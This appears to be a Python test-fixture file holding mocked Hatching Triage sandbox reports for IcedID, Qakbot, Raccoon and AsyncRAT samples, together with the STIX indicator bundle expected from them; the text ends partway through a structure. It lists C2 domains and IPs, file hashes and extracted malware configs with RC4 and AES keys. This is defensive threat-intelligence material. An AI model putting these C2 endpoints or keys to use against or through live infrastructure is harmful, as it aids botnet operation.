from datetime import datetime

query_210609_c67qy7hmpe = {
    "version": "0.2.3",
    "sample": {
        "id": "210609-c67qy7hmpe",
        "score": 10,
        "target": "0d78a33a77954db9c2fd31198710d9beef5f8e1b5147890231896f5628bc4a2b",
        "size": 59480,
        "md5": "a99f6f41e94c0c9dac365e9bd194391c",
        "sha1": "12c8adf784f2e3072cd6142d87c052e3fddde059",
        "sha256": "0d78a33a77954db9c2fd31198710d9beef5f8e1b5147890231896f5628bc4a2b",
        "sha512": "569184b18e66eaa908744acfddc83ec954d1e62d69c254634c60e48f8f5b036b"
        "94ab8ddb32a8431c4a17312a97b4cc4a53dfef3957bf5dc627449ed8e88427df",
        "created": "2021-06-09T19:14:10Z",
        "completed": "2021-06-09T19:17:42Z",
    },
    "tasks": [
        {
            "sample": "210609-c67qy7hmpe",
            "kind": "behavioral",
            "name": "behavioral1",
            "status": "reported",
            "tags": ["family:icedid", "campaign:515013989", "banker", "trojan"],
            "score": 10,
            "target": "0d78a33a77954db9c2fd31198710d9beef5f8e1b5147890231896f5628bc4a2b.dll",
            "backend": "fu1m1",
            "resource": "win7v20210410",
            "platform": "windows7_x64",
            "queue_id": 3195198,
        },
        {
            "sample": "210609-c67qy7hmpe",
            "kind": "behavioral",
            "name": "behavioral2",
            "status": "reported",
            "tags": ["family:icedid", "campaign:515013989", "banker", "trojan"],
            "score": 10,
            "target": "0d78a33a77954db9c2fd31198710d9beef5f8e1b5147890231896f5628bc4a2b.dll",
            "backend": "horse2",
            "resource": "win10v20210408",
            "platform": "windows10_x64",
            "queue_id": 3195199,
        },
        {
            "sample": "210609-c67qy7hmpe",
            "kind": "static",
            "name": "static1",
            "status": "reported",
        },
    ],
    "analysis": {
        "score": 10,
        "family": ["icedid"],
        "tags": ["family:icedid", "campaign:515013989", "banker", "trojan"],
    },
    "targets": [
        {
            "tasks": ["behavioral1", "behavioral2"],
            "score": 10,
            "target": "0d78a33a77954db9c2fd31198710d9beef5f8e1b5147890231896f5628bc4a2b",
            "size": 59480,
            "md5": "a99f6f41e94c0c9dac365e9bd194391c",
            "sha1": "12c8adf784f2e3072cd6142d87c052e3fddde059",
            "sha256": "0d78a33a77954db9c2fd31198710d9beef5f8e1b5147890231896f5628bc4a2b",
            "sha512": "569184b18e66eaa908744acfddc83ec954d1e62d69c254634c60e48f8f5b036b"
            "94ab8ddb32a8431c4a17312a97b4cc4a53dfef3957bf5dc627449ed8e88427df",
            "tags": ["family:icedid", "campaign:515013989", "banker", "trojan"],
            "family": ["icedid"],
            "signatures": [
                {
                    "label": "icedid",
                    "name": "IcedID, BokBot",
                    "score": 10,
                    "tags": ["trojan", "banker", "family:icedid"],
                    "desc": "IcedID is a banking trojan capable of stealing credentials.",
                },
                {"name": "Suspicious behavior: EnumeratesProcesses"},
            ],
            "iocs": {
                "urls": ["https://aws.amazon.com/", "http://dilmopozira.top/"],
                "domains": ["aws.amazon.com", "dilmopozira.top"],
                "ips": ["8.8.8.8", "13.227.208.72", "172.67.213.147", "104.21.45.114"],
            },
        }
    ],
    "signatures": [
        {
            "label": "icedid",
            "name": "IcedID, BokBot",
            "score": 10,
            "tags": ["trojan", "banker", "family:icedid"],
            "desc": "IcedID is a banking trojan capable of stealing credentials.",
        },
        {"name": "Suspicious behavior: EnumeratesProcesses"},
    ],
    "extracted": [
        {
            "tasks": ["behavioral1", "behavioral2"],
            "dumped_file": "memory/1032-61-0x00000000001D0000-0x000000000021D000-memory.dmp",
            "resource": "behavioral1/memory/1032-61-0x00000000001D0000-0x000000000021D000-memory.dmp",
            "config": {
                "family": "icedid",
                "rule": "IcedidFirstLoader",
                "c2": ["dilmopozira.top"],
                "campaign": "515013989",
            },
        }
    ],
}

query_210609_c67qy7hmpe_static = {
    "version": "0.2",
    "sample": {
        "sample": "210609-c67qy7hmpe",
        "kind": "file",
        "size": 59480,
        "target": "0d78a33a77954db9c2fd31198710d9beef5f8e1b5147890231896f5628bc4a2b",
    },
    "task": {
        "task": "210609-c67qy7hmpe-static1",
        "target": "0d78a33a77954db9c2fd31198710d9beef5f8e1b5147890231896f5628bc4a2b",
    },
    "analysis": {"reported": "2021-06-09T19:14:10Z"},
    "files": [
        {
            "filename": "0d78a33a77954db9c2fd31198710d9beef5f8e1b5147890231896f5628bc4a2b",
            "filesize": 59480,
            "md5": "a99f6f41e94c0c9dac365e9bd194391c",
            "sha1": "12c8adf784f2e3072cd6142d87c052e3fddde059",
            "sha256": "0d78a33a77954db9c2fd31198710d9beef5f8e1b5147890231896f5628bc4a2b",
            "sha512": "569184b18e66eaa908744acfddc83ec954d1e62d69c254634c60e48f8f5b036b94ab8ddb32a8431c4a17312a97b4cc4a53dfef3957bf5dc627449ed8e88427df",
            "exts": [".dll"],
            "tags": ["windows", "x64", "regsvr32"],
            "depth": 0,
            "kind": "file",
            "selected": True,
            "runas": "0d78a33a77954db9c2fd31198710d9beef5f8e1b5147890231896f5628bc4a2b.dll",
            "metadata": {
                "pe": {
                    "timestamp": 1623150719,
                    "exports": [
                        "BzuelsppKmjffwlkjrSwmimoh",
                        "DllRegisterServer",
                        "DygskcpixseqhoAdipmlarziglig",
                        "IizqiIylhlvunXzwytmaim",
                        "PluginInit",
                        "WdemieipeRssdveevhwcn",
                    ],
                }
            },
        }
    ],
    "unpack_count": 0,
    "error_count": 0,
}

query_210609_8ddyb8de5s = {
    "version": "0.2.3",
    "sample": {
        "id": "210609-8ddyb8de5s",
        "score": 10,
        "target": "d7b9ef581459a0d8f94b789ae07a9e0892c0f0d0bcc74.dll",
        "size": 531585,
        "md5": "4ca603fb87d28b9da39f1174a426da43",
        "sha1": "d265a8d6da40244503867c8d59d8eeb136544a3d",
        "sha256": "d7b9ef581459a0d8f94b789ae07a9e0892c0f0d0bcc7416a45471fe817ce377d",
        "sha512": "53907a5812f70114e44edab589e9455eddcd3fd0e997475dada178ea568c943c"
        "8db0d41cb58b725832973ed035fb47f6fc412c210ee8760767ab0047becbf38d",
        "created": "2021-06-09T19:02:22Z",
        "completed": "2021-06-09T19:05:30Z",
    },
    "tasks": [
        {
            "sample": "210609-8ddyb8de5s",
            "kind": "behavioral",
            "name": "behavioral1",
            "status": "reported",
            "tags": ["family:icedid", "campaign:2369677829", "banker", "trojan"],
            "score": 10,
            "target": "d7b9ef581459a0d8f94b789ae07a9e0892c0f0d0bcc74.dll",
            "backend": "horse2",
            "resource": "win7v20210408",
            "platform": "windows7_x64",
            "queue_id": 3195040,
        },
        {
            "sample": "210609-8ddyb8de5s",
            "kind": "behavioral",
            "name": "behavioral2",
            "status": "reported",
            "tags": ["family:icedid", "campaign:2369677829", "banker", "trojan"],
            "score": 10,
            "target": "d7b9ef581459a0d8f94b789ae07a9e0892c0f0d0bcc74.dll",
            "backend": "fu1m1",
            "resource": "win10v20210410",
            "platform": "windows10_x64",
            "queue_id": 3195041,
        },
        {
            "sample": "210609-8ddyb8de5s",
            "kind": "static",
            "name": "static1",
            "status": "reported",
        },
    ],
    "analysis": {
        "score": 10,
        "family": ["icedid"],
        "tags": ["family:icedid", "campaign:2369677829", "banker", "trojan"],
    },
    "targets": [
        {
            "tasks": ["behavioral1", "behavioral2"],
            "score": 10,
            "target": "d7b9ef581459a0d8f94b789ae07a9e0892c0f0d0bcc74.dll",
            "size": 531585,
            "md5": "4ca603fb87d28b9da39f1174a426da43",
            "sha1": "d265a8d6da40244503867c8d59d8eeb136544a3d",
            "sha256": "d7b9ef581459a0d8f94b789ae07a9e0892c0f0d0bcc7416a45471fe817ce377d",
            "sha512": "53907a5812f70114e44edab589e9455eddcd3fd0e997475dada178ea568c943c"
            "8db0d41cb58b725832973ed035fb47f6fc412c210ee8760767ab0047becbf38d",
            "tags": ["family:icedid", "campaign:2369677829", "banker", "trojan"],
            "family": ["icedid"],
            "signatures": [
                {
                    "label": "icedid",
                    "name": "IcedID, BokBot",
                    "score": 10,
                    "tags": ["trojan", "banker", "family:icedid"],
                    "desc": "IcedID is a banking trojan capable of stealing credentials.",
                },
                {"name": "Suspicious behavior: EnumeratesProcesses"},
            ],
            "iocs": {
                "urls": ["https://aws.amazon.com/", "http://potimomainger.top/"],
                "domains": ["aws.amazon.com", "potimomainger.top"],
                "ips": ["8.8.8.8", "13.227.208.72", "104.21.36.6"],
            },
        }
    ],
    "signatures": [
        {
            "label": "icedid",
            "name": "IcedID, BokBot",
            "score": 10,
            "tags": ["trojan", "banker", "family:icedid"],
            "desc": "IcedID is a banking trojan capable of stealing credentials.",
        },
        {"name": "Suspicious behavior: EnumeratesProcesses"},
    ],
    "extracted": [
        {
            "tasks": ["behavioral1", "behavioral2"],
            "dumped_file": "memory/1208-60-0x0000000001BC0000-0x0000000001BC7000-memory.dmp",
            "resource": "behavioral1/memory/1208-60-0x0000000001BC0000-0x0000000001BC7000-memory.dmp",
            "config": {
                "family": "icedid",
                "rule": "IcedidFirstLoader",
                "c2": ["potimomainger.top"],
                "campaign": "2369677829",
            },
        }
    ],
}


query_icedid = {
    "data": [
        {
            "id": "210609-c67qy7hmpe",
            "status": "reported",
            "kind": "file",
            "filename": "0a2ef710d189cb3b5e94a2f38de3950a20b84c891cec6dbfe83e2394fdabc113",
            "tasks": [
                {"id": "static1", "status": "reported"},
                {
                    "id": "behavioral1",
                    "status": "reported",
                    "target": "0a2ef710d189cb3b5e94a2f38de3950a20b84c891cec6dbfe83e2394fdabc113.dll",
                },
                {
                    "id": "behavioral2",
                    "status": "reported",
                    "target": "0a2ef710d189cb3b5e94a2f38de3950a20b84c891cec6dbfe83e2394fdabc113.dll",
                },
            ],
            "submitted": datetime.now().strftime("%Y-%m-%dT%H:%M:%SZ"),
            "completed": "2021-06-15T07:47:36Z",
        }
    ],
}

query_qakbot = {
    "data": [
        {
            "id": "210614-dgzch44pyn",
            "status": "reported",
            "kind": "file",
            "filename": "qbot-0614.bin",
            "tasks": [
                {"id": "static1", "status": "reported"},
                {
                    "id": "behavioral1",
                    "status": "reported",
                    "target": "qbot-0614.bin.dll",
                },
                {
                    "id": "behavioral2",
                    "status": "reported",
                    "target": "qbot-0614.bin.dll",
                },
            ],
            "submitted": datetime.now().strftime("%Y-%m-%dT%H:%M:%SZ"),
            "completed": "2021-06-14T16:50:01Z",
        }
    ],
}

query_210614_dgzch44pyn = {
    "version": "0.2.3",
    "sample": {
        "id": "210614-dgzch44pyn",
        "score": 10,
        "target": "qbot-0614.bin",
        "size": 1090048,
        "md5": "2fc699eb45d1351b56eca349ae09638a",
        "sha1": "4b24eb640b3c2a845686a2ab0f8a5ab119faf91e",
        "sha256": "d8fc94e976e8c47d37d227fe353b60ba54c31264a08171bf59b575958b122bdc",
        "sha512": "5dc4b55547753bae7fbfd566fc0a51625022343d92e1b81b6f18a84c52c03766"
        "adac05dee2af1181049ab62575a2c752e6f907aef3fb3e77f59c1b4092a86106",
        "created": "2021-06-14T16:48:08Z",
        "completed": "2021-06-14T16:50:01Z",
    },
    "tasks": [
        {
            "sample": "210614-dgzch44pyn",
            "kind": "behavioral",
            "name": "behavioral1",
            "status": "reported",
            "tags": [
                "family:qakbot",
                "botnet:obama59",
                "campaign:1623398674",
                "banker",
                "stealer",
                "trojan",
            ],
            "score": 10,
            "target": "qbot-0614.bin.dll",
            "backend": "horse2",
            "resource": "win7v20210408",
            "platform": "windows7_x64",
            "queue_id": 3212009,
        },
        {
            "sample": "210614-dgzch44pyn",
            "kind": "behavioral",
            "name": "behavioral2",
            "status": "reported",
            "tags": [
                "family:qakbot",
                "botnet:obama59",
                "campaign:1623398674",
                "banker",
                "stealer",
                "trojan",
            ],
            "score": 10,
            "target": "qbot-0614.bin.dll",
            "backend": "fu1m1",
            "resource": "win10v20210410",
            "platform": "windows10_x64",
            "queue_id": 3212010,
        },
        {
            "sample": "210614-dgzch44pyn",
            "kind": "static",
            "name": "static1",
            "status": "reported",
        },
    ],
    "analysis": {
        "score": 10,
        "family": ["qakbot"],
        "tags": [
            "family:qakbot",
            "botnet:obama59",
            "campaign:1623398674",
            "banker",
            "stealer",
            "trojan",
        ],
    },
    "targets": [
        {
            "tasks": ["behavioral1", "behavioral2"],
            "score": 10,
            "target": "qbot-0614.bin",
            "size": 1090048,
            "md5": "2fc699eb45d1351b56eca349ae09638a",
            "sha1": "4b24eb640b3c2a845686a2ab0f8a5ab119faf91e",
            "sha256": "d8fc94e976e8c47d37d227fe353b60ba54c31264a08171bf59b575958b122bdc",
            "sha512": "5dc4b55547753bae7fbfd566fc0a51625022343d92e1b81b6f18a84c52c03766"
            "adac05dee2af1181049ab62575a2c752e6f907aef3fb3e77f59c1b4092a86106",
            "tags": [
                "family:qakbot",
                "botnet:obama59",
                "campaign:1623398674",
                "banker",
                "stealer",
                "trojan",
            ],
            "family": ["qakbot"],
            "signatures": [
                {
                    "label": "qakbot",
                    "name": "Qakbot/Qbot",
                    "score": 10,
                    "tags": ["trojan", "banker", "stealer", "family:qakbot"],
                    "desc": "Qbot or Qakbot is a sophisticated worm with banking capabilities.",
                },
                {
                    "label": "schtasks_persist",
                    "name": "Creates scheduled task(s)",
                    "ttp": ["T1053"],
                    "tags": ["persistence"],
                    "desc": "Schtasks is often used by malware for persistence to perform post-infection execution.",
                },
                {"name": "Suspicious behavior: EnumeratesProcesses"},
                {"name": "Suspicious behavior: MapViewOfSection"},
                {"name": "Suspicious use of WriteProcessMemory"},
            ],
        }
    ],
    "signatures": [
        {
            "label": "qakbot",
            "name": "Qakbot/Qbot",
            "score": 10,
            "tags": ["trojan", "banker", "stealer", "family:qakbot"],
            "desc": "Qbot or Qakbot is a sophisticated worm with banking capabilities.",
        },
        {
            "label": "schtasks_persist",
            "name": "Creates scheduled task(s)",
            "ttp": ["T1053"],
            "tags": ["persistence"],
            "desc": "Schtasks is often used by malware for persistence to perform post-infection execution.",
        },
        {"name": "Suspicious behavior: EnumeratesProcesses"},
        {"name": "Suspicious behavior: MapViewOfSection"},
        {"name": "Suspicious use of WriteProcessMemory"},
    ],
    "extracted": [
        {
            "tasks": ["behavioral1", "behavioral2"],
            "dumped_file": "memory/2004-61-0x00000000750B0000-0x00000000750ED000-memory.dmp",
            "resource": "behavioral1/memory/2004-61-0x00000000750B0000-0x00000000750ED000-memory.dmp",
            "config": {
                "family": "qakbot",
                "rule": "Qakbot",
                "c2": [
                    "105.198.236.101:443",
                ],
                "version": "402.68",
                "botnet": "obama59",
                "campaign": "1623398674",
            },
        }
    ],
}

query_kdfjzkhfehvfjz = {"data": [], "next": "null"}

query_211006_qkva7sbdgj = {
    "analysis": {
        "family": ["raccoon"],
        "score": 10,
        "tags": [
            "family:raccoon",
            "botnet:27c9b6ae257af0ad6f3f3330ea633fc782fa4daf",
            "stealer",
        ],
    },
    "extracted": [
        {
            "config": {
                "attr": {
                    "url4cnc": [
                        "http://teletop.top/iot3redisium",
                        "http://teleta.top/iot3redisium",
                        "https://t.me/iot3redisium",
                    ]
                },
                "botnet": "27c9b6ae257af0ad6f3f3330ea633fc782fa4daf",
                "family": "raccoon",
                "keys": [
                    {"key": "config_key", "kind": "rc4.plain", "value": "iV8+pT5$yP7{"},
                    {
                        "key": "cnc_key",
                        "kind": "rc4.plain",
                        "value": "3d22d40e8c018c16294c0da2f963eac1",
                    },
                ],
                "rule": "Raccoon",
                "version": "1.8.2",
            },
            "dumped_file": "memory/1928-62-0x0000000000000000-mapping.dmp",
            "resource": "behavioral1/memory/1928-62-0x0000000000000000-mapping.dmp",
            "tasks": ["behavioral1", "behavioral2"],
        }
    ],
    "sample": {
        "completed": "2021-10-06T13:22:24Z",
        "created": "2021-10-06T13:19:39Z",
        "id": "211006-qkva7sbdgj",
        "md5": "03ce02744fd076b14a4af3dd7c6574b2",
        "score": 10,
        "sha1": "f78ed7f8402b46e6a514d1dfd993710796ef9788",
        "sha256": "b7e586f26bca40a24e14dadfe0df9902d34da6cc737ae22a91c21ebe0e98e66d",
        "sha512": "e06be2e4936cc07a8484eb3e9eeced63998447f3c25f7e4f1cb3358afe25fd57"
        "72b13b020f9510021df9fffd493d5d9747d3b33a3228c24662533af5f5c93914",
        "size": 606495,
        "target": "IMAGE-07102021.7z",
    },
    "signatures": [
        {
            "desc": "Simple but powerful infostealer which was very active in 2019.",
            "label": "raccoon",
            "name": "Raccoon",
            "score": 10,
            "tags": ["stealer", "family:raccoon"],
        },
        {"name": "Suspicious use of NtCreateProcessExOtherParentProcess", "score": 10},
        {"name": "Loads dropped DLL", "score": 7},
        {
            "desc": "Attempts to interact with connected storage/optical drive(s). Likely ransomware behaviour.",
            "label": "file_antivm_ide_drive",
            "name": "Enumerates physical storage devices",
            "score": 3,
            "ttp": ["T1082"],
        },
        {"label": "program_crash", "name": "Program crash", "score": 3},
        {
            "indicators": [
                {
                    "resource": "static1/unpack001/IMAGE-07102021.exe",
                    "yara_rule": "nsis_installer_1",
                },
                {
                    "resource": "static1/unpack001/IMAGE-07102021.exe",
                    "yara_rule": "nsis_installer_2",
                },
            ],
            "name": "NSIS installer",
            "score": 1,
            "tags": ["installer"],
        },
        {"name": "Suspicious behavior: EnumeratesProcesses"},
        {"name": "Suspicious behavior: GetForegroundWindowSpam"},
        {"name": "Suspicious use of AdjustPrivilegeToken"},
        {"name": "Suspicious use of WriteProcessMemory"},
    ],
    "targets": [
        {
            "family": ["raccoon"],
            "iocs": {
                "domains": ["teletop.top"],
                "ips": ["8.8.8.8", "104.21.17.146", "185.163.47.232"],
                "urls": ["http://teletop.top/iot3redisium", "http://185.163.47.232/"],
            },
            "md5": "f626600409cd7eaa72c1105a52002cd5",
            "pick": "unpack001/IMAGE-07102021.exe",
            "score": 10,
            "sha1": "f6f5202b9e38a257f5f0bbc784eb4b9ff6c481af",
            "sha256": "459d4fd9bd7ec69f47d9c3306856a7e6ec39b17ff2c88ae80dcac8e9daba760e",
            "sha512": "f0f6c423af7b0746c6687048b49d378988714321d5d353400616929dfc591da8"
            "77fe658d9c6a36dbb859c33b788f8005db72fa981944a80476d57929d7a46524",
            "signatures": [
                {
                    "desc": "Simple but powerful infostealer which was very active in 2019.",
                    "label": "raccoon",
                    "name": "Raccoon",
                    "score": 10,
                    "tags": ["stealer", "family:raccoon"],
                },
                {
                    "name": "Suspicious use of NtCreateProcessExOtherParentProcess",
                    "score": 10,
                },
                {"name": "Loads dropped DLL", "score": 7},
                {
                    "desc": "Attempts to interact with connected storage/optical drive(s).",
                    "label": "file_antivm_ide_drive",
                    "name": "Enumerates physical storage devices",
                    "score": 3,
                    "ttp": ["T1082"],
                },
                {"label": "program_crash", "name": "Program crash", "score": 3},
                {"name": "Suspicious behavior: EnumeratesProcesses"},
                {"name": "Suspicious behavior: GetForegroundWindowSpam"},
                {"name": "Suspicious use of AdjustPrivilegeToken"},
                {"name": "Suspicious use of WriteProcessMemory"},
            ],
            "size": 622595,
            "tags": [
                "family:raccoon",
                "botnet:27c9b6ae257af0ad6f3f3330ea633fc782fa4daf",
                "stealer",
            ],
            "target": "IMAGE-07102021.exe",
            "tasks": ["behavioral1", "behavioral2"],
        }
    ],
    "tasks": {
        "211006-qkva7sbdgj-behavioral1": {
            "backend": "horse2",
            "kind": "behavioral",
            "name": "behavioral1",
            "pick": "static1/unpack001/IMAGE-07102021.exe",
            "platform": "windows7_x64",
            "queue_id": 3498328,
            "resource": "win7v20210408",
            "score": 10,
            "status": "reported",
            "tags": [
                "family:raccoon",
                "botnet:27c9b6ae257af0ad6f3f3330ea633fc782fa4daf",
                "stealer",
            ],
            "target": "IMAGE-07102021.exe",
        },
        "211006-qkva7sbdgj-behavioral2": {
            "backend": "horse2",
            "kind": "behavioral",
            "name": "behavioral2",
            "pick": "static1/unpack001/IMAGE-07102021.exe",
            "platform": "windows10_x64",
            "queue_id": 3498329,
            "resource": "win10v20210408",
            "score": 10,
            "status": "reported",
            "tags": [
                "family:raccoon",
                "botnet:27c9b6ae257af0ad6f3f3330ea633fc782fa4daf",
                "stealer",
            ],
            "target": "IMAGE-07102021.exe",
        },
        "211006-qkva7sbdgj-static1": {
            "kind": "static",
            "name": "static1",
            "score": 1,
            "status": "reported",
        },
    },
    "version": "0.2.3",
}

triage_raw_results = [
    {
        "malware": "icedid",
        "samples": {
            "210609-c67qy7hmpe": {
                "sample_c2s": ["dilmopozira.top"],
                "sample_urls": [],
                "sample_hashes": [
                    "a99f6f41e94c0c9dac365e9bd194391c",
                    "12c8adf784f2e3072cd6142d87c052e3fddde059",
                    "0d78a33a77954db9c2fd31198710d9beef5f8e1b5147890231896f5628bc4a2b",
                    "569184b18e66eaa908744acfddc83ec954d1e62d69c254634c60e48f8f5b036b"
                    "94ab8ddb32a8431c4a17312a97b4cc4a53dfef3957bf5dc627449ed8e88427df",
                ],
            }
        },
    },
    {
        "malware": "qakbot",
        "samples": {
            "210614-dgzch44pyn": {
                "sample_c2s": ["105.198.236.101:443"],
                "sample_urls": [],
                "sample_hashes": [
                    "2fc699eb45d1351b56eca349ae09638a",
                    "4b24eb640b3c2a845686a2ab0f8a5ab119faf91e",
                    "d8fc94e976e8c47d37d227fe353b60ba54c31264a08171bf59b575958b122bdc",
                    "5dc4b55547753bae7fbfd566fc0a51625022343d92e1b81b6f18a84c52c03766"
                    "adac05dee2af1181049ab62575a2c752e6f907aef3fb3e77f59c1b4092a86106",
                ],
            }
        },
    },
]

expected_bundle = {
    "type": "bundle",
    "id": "bundle--5b10333c-12eb-46aa-b32e-8714fc9c7345",
    "objects": [
        {
            "type": "domain-name",
            "id": "domain-name--a343632b-4b97-4374-86da-0a66dbb87c52",
            "value": "dilmopozira.top",
            "x_inthreat_tags": [{"name": "icedid", "valid_from": "2021-06-16T09:40:16.591437Z"}],
            "x_external_references": [
                {
                    "description": "icedid sample analyzed by Hatching's sandbox",
                    "source_name": "Hatching Triage",
                    "url": "https://tria.ge/210609-c67qy7hmpe",
                }
            ],
        },
        {
            "type": "file",
            "id": "file--251dd6ff-d8cd-4ce7-a2e9-575decab7b6e",
            "hashes": {
                "MD5": "a99f6f41e94c0c9dac365e9bd194391c",
                "SHA-1": "12c8adf784f2e3072cd6142d87c052e3fddde059",
                "SHA-256": "0d78a33a77954db9c2fd31198710d9beef5f8e1b5147890231896f5628bc4a2b",
                "SHA-512": "569184b18e66eaa908744acfddc83ec954d1e62d69c254634c60e48f8f5b036b"
                "94ab8ddb32a8431c4a17312a97b4cc4a53dfef3957bf5dc627449ed8e88427df",
            },
            "x_inthreat_tags": [{"name": "icedid", "valid_from": "2021-06-16T09:40:16.59151Z"}],
            "x_external_references": [
                {
                    "description": "icedid sample analyzed by Hatching's sandbox",
                    "source_name": "Hatching Triage",
                    "url": "https://tria.ge/210609-c67qy7hmpe",
                }
            ],
        },
        {
            "type": "ipv4-addr",
            "id": "ipv4-addr--33416f5c-d1ae-4afc-8381-c0a6fef05ea6",
            "value": "105.198.236.101",
            "x_inthreat_tags": [{"name": "qakbot", "valid_from": "2021-06-16T09:40:16.591585Z"}],
            "x_external_references": [
                {
                    "description": "qakbot sample analyzed by Hatching's sandbox",
                    "source_name": "Hatching Triage",
                    "url": "https://tria.ge/210614-dgzch44pyn",
                }
            ],
        },
        {
            "type": "file",
            "id": "file--9b29b9b8-215f-407d-aee2-551a208bfbaa",
            "hashes": {
                "MD5": "2fc699eb45d1351b56eca349ae09638a",
                "SHA-1": "4b24eb640b3c2a845686a2ab0f8a5ab119faf91e",
                "SHA-256": "d8fc94e976e8c47d37d227fe353b60ba54c31264a08171bf59b575958b122bdc",
                "SHA-512": "5dc4b55547753bae7fbfd566fc0a51625022343d92e1b81b6f18a84c52c03766"
                "adac05dee2af1181049ab62575a2c752e6f907aef3fb3e77f59c1b4092a86106",
            },
            "x_inthreat_tags": [{"name": "qakbot", "valid_from": "2021-06-16T09:40:16.591627Z"}],
            "x_external_references": [
                {
                    "description": "qakbot sample analyzed by Hatching's sandbox",
                    "source_name": "Hatching Triage",
                    "url": "https://tria.ge/210614-dgzch44pyn",
                }
            ],
        },
    ],
}

query_211118_a13draede7 = {
    "analysis": {
        "family": ["asyncrat"],
        "score": 10,
        "tags": ["family:asyncrat", "botnet:khalelmybrother", "persistence", "rat"],
    },
    "errors": [
        {
            "reason": "static1/unpack001/�: Picked file does not exist",
            "task": "behavioral1",
        },
        {
            "reason": "static1/unpack001/�: Picked file does not exist",
            "task": "behavioral2",
        },
        {
            "reason": "platform exec: exit status 1: image=C:\\Users\\Admin\\AppData\\Local\\Temp\\'.exe\ncommand=\"C"
            ":\\Users\\Admin\\AppData\\Local\\Temp\\'.exe\"\nwdir=C:\\Users\\Admin\\AppData\\Local\\Temp\nPayload err"
            "or: The %1 application cannot be run in Win32 mode.\n",
            "task": "behavioral4",
        },
    ],
    "extracted": [
        {
            "config": {
                "attr": {
                    "anti_vm": "false",
                    "bsod": "false",
                    "delay": 1,
                    "install": "false",
                    "install_folder": "%AppData%",
                    "pastebin_config": "null",
                },
                "botnet": "KHALELMYBROTHER",
                "c2": ["144.217.68.78:3010"],
                "family": "asyncrat",
                "keys": [
                    {
                        "key": "aes_key",
                        "kind": "aes.plain",
                        "value": "4DQWehnmo5t8kMYDlbosDtwhTY3tZNXg",
                    }
                ],
                "mutex": ["DcRat44Mgfgfutex_qwqdanfgfgchun"],
                "rule": "AsyncRAT",
                "version": "1.0.7",
            },
            "dumped_file": "memory/824-123-0x0000000000400000-0x0000000000412000-memory.dmp",
            "resource": "behavioral3/memory/824-123-0x0000000000400000-0x0000000000412000-memory.dmp",
            "tasks": ["behavioral3"],
        }
    ],
    "sample": {
        "completed": "2021-11-18T00:42:12Z",
        "created": "2021-11-18T00:41:34Z",
        "id": "211118-a13draede7",
        "md5": "9a1fba64aa6a810a9691fb4a2b9dd7bd",
        "score": 10,
        "sha1": "910fd3c47d834de5af91466bb57a03c21da6e916",
        "sha256": "9ec9d84b8ea1265c494954a81509df8444583965182729a000a99a9562a9e28e",
        "sha512": "d0d2dc966bdaba673fee2a5cf7feb7fab2a02038c0706b20538b852d7715e0aa"
        "7383bc5787fee7e6133dc76a5e76ba075902069668d9a23885747db9fb3b4862",
        "size": 252099,
        "target": "invoice.zip",
    },
    "signatures": [
        {
            "desc": "AsyncRAT is designed to remotely monitor and control other computers.",
            "label": "asyncrat",
            "name": "AsyncRat",
            "score": 10,
            "tags": ["rat", "family:asyncrat"],
        },
        {
            "label": "creates_com_server_autorun",
            "name": "Registers COM server for autorun",
            "score": 10,
            "tags": ["persistence"],
            "ttp": ["T1060"],
        },
        {
            "indicators": [
                {
                    "resource": "behavioral3/memory/824-124-0x000000000040CB9E-mapping.dmp",
                    "yara_rule": "asyncrat",
                },
                {
                    "resource": "behavioral3/memory/824-123-0x0000000000400000-0x0000000000412000-memory.dmp",
                    "yara_rule": "asyncrat",
                },
                {
                    "resource": "behavioral3/memory/3444-130-0x000000000040CB9E-mapping.dmp",
                    "yara_rule": "asyncrat",
                },
                {
                    "resource": "behavioral3/memory/1060-136-0x000000000040CB9E-mapping.dmp",
                    "yara_rule": "asyncrat",
                },
                {
                    "resource": "behavioral3/memory/824-148-0x0000000005A40000-0x0000000005A47000-memory.dmp",
                    "yara_rule": "asyncrat",
                },
                {
                    "resource": "behavioral3/memory/824-152-0x0000000006C50000-0x0000000006C59000-memory.dmp",
                    "yara_rule": "asyncrat",
                },
            ],
            "name": "Async RAT payload",
            "score": 9,
            "tags": ["rat"],
        },
        {"name": "Loads dropped DLL", "score": 7},
        {"name": "Suspicious use of SetThreadContext", "score": 5},
        {
            "desc": "Attempts to interact with connected storage/optical drive(s). Likely ransomware behaviour.",
            "label": "file_antivm_ide_drive",
            "name": "Enumerates physical storage devices",
            "score": 3,
            "ttp": ["T1082"],
        },
        {"label": "reg_software_classes", "name": "Modifies registry class"},
        {
            "label": "modifies_certificate_store_registry",
            "name": "Modifies system certificate store",
            "tags": ["evasion", "spyware", "trojan"],
            "ttp": ["T1130", "T1112"],
        },
        {"name": "Suspicious behavior: EnumeratesProcesses"},
        {"name": "Suspicious use of AdjustPrivilegeToken"},
        {"name": "Suspicious use of WriteProcessMemory"},
    ],
    "targets": [
        {
            "md5": "72565e7a0145e0657e586f6cf7696dc7",
            "pick": "unpack001/'",
            "score": 1,
            "sha1": "11eba7b1e26cc7d492a2c161ac48370811d0b01e",
            "sha256": "6f1c9b4c187669bc0371260d121caf48d65f829a9104c483befbd8fc0bed24f5",
            "sha512": "e099ac9c0e6ed1ff8c3307f17ccb13a0306178679a3f7f5ab4b23699fad859b3"
            "101243e2782771ca2b9b8fa2785437fbe71a7f04633f45732eb3e0c998603d20",
            "signatures": [],
            "size": 17600,
            "target": "'",
            "tasks": ["behavioral1", "behavioral2"],
        },
        {
            "family": ["asyncrat"],
            "iocs": {
                "domains": ["time.windows.com"],
                "ips": ["144.217.68.78", "8.8.8.8", "40.119.148.38"],
            },
            "md5": "44da69bb3848a28c8ba2238537a90da6",
            "pick": "unpack001/invoice_payment.vbs",
            "score": 10,
            "sha1": "d538186f09636dc7ce559452bb9b7632fe99fb5c",
            "sha256": "d90936e1911b9a666b60051a817ae1b91f26e8b89e4d5041bdcad77ea2087c66",
            "sha512": "7d834ab7a9783485b130835215eb2c0766d104a3713a8787971572eac5d21721"
            "0144a008b6aa38df4e6785e4739086fae8c78efc79394d2f527f2a964a51b326",
            "signatures": [
                {
                    "desc": "AsyncRAT is designed to remotely monitor and control other computers.",
                    "label": "asyncrat",
                    "name": "AsyncRat",
                    "score": 10,
                    "tags": ["rat", "family:asyncrat"],
                },
                {
                    "label": "creates_com_server_autorun",
                    "ttp": ["T1060"],
                },
                {
                    "indicators": [
                        {
                            "resource": "behavioral3/memory/824-124-0x000000000040CB9E-mapping.dmp",
                            "yara_rule": "asyncrat",
                        },
                        {
                            "resource": "behavioral3/memory/824-123-0x0000000000400000-0x0000000000412000-memory.dmp",
